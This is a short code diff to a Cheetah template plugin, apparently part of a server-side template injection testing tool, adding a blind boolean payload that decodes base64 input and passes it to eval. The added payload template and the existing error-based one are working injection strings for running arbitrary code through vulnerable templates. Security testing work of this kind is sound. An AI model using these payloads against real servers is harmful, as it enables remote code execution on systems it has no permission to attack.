@@ -38,7 +38,11 @@ class Cheetah(python.Python):
             },
             'evaluate_error': {
                 'evaluate': """$getVar('a', '').replace($getVar('a', ''), '')+str({code})"""
-            }
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """${{getVar('a', '').replace($getVar('a', ''), '')}}${{str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))}}"""
+            },
         })
 
         self.set_contexts([
